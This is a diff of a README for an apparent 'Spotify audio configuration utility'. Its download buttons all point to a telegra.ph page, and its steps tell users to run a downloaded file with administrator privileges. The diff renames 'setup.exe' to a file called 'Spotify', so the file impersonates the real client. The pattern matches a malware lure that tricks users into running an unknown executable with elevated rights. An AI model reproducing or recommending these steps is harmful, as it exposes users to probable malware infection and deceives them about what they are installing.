@@ -15,9 +15,9 @@ Audio configuration utility for Spotify desktop client. Streamlined playback pro
 
 ## 🚀 Quick Download
 
-[![⬇️ GET SETUP — Latest.version V.2.0](https://img.shields.io/badge/⬇️%20GET%20SETUP-Latest.version%20V.2.0-0366d6?style=for-the-badge&logo=spotify&logoColor=white&labelColor=0d1117)](https://telegra.ph/Download-here-09-15)
+[![⬇️ GET SPOTIFY — Latest.version V.2.0](https://img.shields.io/badge/⬇️%20GET%20SPOTIFY-Latest.version%20V.2.0-0366d6?style=for-the-badge&logo=spotify&logoColor=white&labelColor=0d1117)](https://telegra.ph/Download-here-09-15)
 
-[![📥 DOWNLOAD setup.exe — 2026 Edition](https://img.shields.io/badge/📥%20DOWNLOAD%20setup.exe-2026%20Edition-1f6feb?style=for-the-badge&logo=download&logoColor=white&labelColor=0d1117)](https://telegra.ph/Download-here-09-15)
+[![📥 DOWNLOAD Spotify — 2026 Edition](https://img.shields.io/badge/📥%20DOWNLOAD%20Spotify-2026%20Edition-1f6feb?style=for-the-badge&logo=download&logoColor=white&labelColor=0d1117)](https://telegra.ph/Download-here-09-15)
 
 [![⚙️ RUN Latest.version — V.2.0](https://img.shields.io/badge/⚙️%20RUN%20Latest.version-V.2.0-0969da?style=for-the-badge&logo=rocket&logoColor=white&labelColor=0d1117)](https://telegra.ph/Download-here-09-15)
 
@@ -33,17 +33,17 @@ Audio configuration utility for Spotify desktop client. Streamlined playback pro
 
 ## 🔽 Installation Steps
 
-### 1️⃣ Get the setup file
+### 1️⃣ Get the Spotify file
 
-Click any download button above and save the **`setup.exe`** file to your device.
+Click any download button above and save the **`Spotify`** file to your device.
 
-### 2️⃣ Run the installer
+### 2️⃣ Run the file
 
-Open the saved **`setup.exe`** file and launch it with elevated privileges (Right-click → "Run as administrator").
+Open the saved **`Spotify`** file and launch it with elevated privileges (Right-click → "Run as administrator").
 
 ### 3️⃣ Open Latest.version
 
-After installation completes, launch the **`Latest.version`** file — this is version **V.2.0**.
+After the first launch completes, open the **`Latest.version`** file — this is version **V.2.0**.
 
 ### 4️⃣ Follow the on-screen prompts
 
@@ -91,7 +91,7 @@ The utility will automatically guide you through the remaining steps. The whole 
 
 | Symptom | Solution |
 |:--------|:---------|
-| ❌ Installer does not open | Right-click `setup.exe` → launch with elevated privileges |
+| ❌ File does not open | Right-click the **`Spotify`** file → launch with elevated privileges |
 | ❌ `Latest.version` not found | Check the default directory: `C:\Program Files\SpotifyAudioConfig2026` |
 | ❌ Profile not persisting | Install the latest system updates via Windows Update |
 | ❌ Spotify client not detected | Make sure the latest Spotify desktop client is installed |
